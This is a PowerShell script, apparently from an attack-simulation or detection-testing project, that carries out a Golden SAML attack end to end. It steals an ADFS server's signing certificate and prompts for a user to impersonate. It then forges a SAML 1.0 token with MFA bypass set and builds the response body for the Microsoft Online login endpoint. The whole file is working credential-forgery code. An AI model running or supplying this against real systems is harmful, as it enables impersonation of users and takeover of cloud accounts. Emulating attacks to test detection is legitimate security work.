<#
.SYNOPSIS
This part of the attack connects to an ADFS server, steals its keys and generates a SAML token

.DESCRIPTION
TA0006: Credential Access
T1606.002: Forge Web Credentials - SAML Tokens
2nd attack method
#>

# We make use of AADInternals
Get-Module | Where-Object name -eq use-aadtools | Remove-Module -Verbose
Import-Module ../APIs/use-aadtools.psm1

# Save the ADFS signing and encryption certificates to a new folder, we only need the former
New-Item -Path $env:TEMP -Name "TA0006 - T1602.002 - A1" -ItemType Directory
Set-Location "$env:TEMP/TA0006 - T1602.002 - A1" 
Export-AADIntADFSCertificates

# To create a SAML token for a specific user, we need their immutable ID
# Since we are creating the response on the server in this case either way
# we might as well use the active directory to figure out the object ID
$objId = $null
$upn = $null
while ($null -eq $objId) {
    $upn = Read-Host "UPN of user to impersonate"
    $objId = (Get-ADUser $upn).ObjectGUID.ToByteArray()
    $upn = (Get-ADUser $upn).UserPrincipalName
}
$immutableId = [System.Convert]::ToBase64String($objId)

# When used in practice, it looks like the NotBefore is about 30 seconds old
# the token and the response object use the same times
$notBefore = (Get-Date).AddSeconds(-30)
$notAfter = $notBefore.AddHours(1)

# Create a SAML 1.0 token
# 2.0 tokens are supported by AADInternals but are not used in practice with the default configuration)
# Since we are mimicking the real scenario, we also create a 1.0 token
$samlToken = New-AADIntSAMLToken `
    -ByPassMFA $True `
    -ImmutableId $immutableId `
    -NotBefore $notBefore `
    -NotAfter $notAfter `
    -PfxFileName "./ADFS_signing.pfx" `
    -Issuer "http://detectabil.it/adfs/services/trust/" `
    -UPN "thisupnisnotcheckedeitherway"
$samlToken = [xml] $samlToken
Write-Warning "SamlToken:"
$samlToken.Save([Console]::Out)

# The destination of the adfs response might be dynamic or it might not be
# We have only seen urn:federation:MicrosoftOnline
$address = (Get-AADIntLoginInformation -UserName $upn).'Cloud Instance audience urn'

# We need to create a response object for the login.srf endpoint
# this is a urldecode of an existing response with some substitutions to let it make sense
$response = [xml] @"
<t:RequestSecurityTokenResponse
	xmlns:t="http://schemas.xmlsoap.org/ws/2005/02/trust">
	<t:Lifetime>
		<wsu:Created xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">$(Get-Date -Format 'o' $notBefore)</wsu:Created>
		<wsu:Expires xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">$(Get-Date -Format 'o' $notAfter)</wsu:Expires>
	</t:Lifetime>
	<wsp:AppliesTo xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy">
		<wsa:EndpointReference xmlns:wsa="http://www.w3.org/2005/08/addressing">
			<wsa:Address>$address</wsa:Address>
		</wsa:EndpointReference>
	</wsp:AppliesTo>
	<t:RequestedSecurityToken>$($samlToken.OuterXml)</t:RequestedSecurityToken>
	<t:TokenType>urn:oasis:names:tc:SAML:1.0:assertion</t:TokenType>
	<t:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</t:RequestType>
	<t:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</t:KeyType>
</t:RequestSecurityTokenResponse>
"@

Write-Warning "XML Body"
#$response.Save([Console]::Out)
Write-Host $response.OuterXml
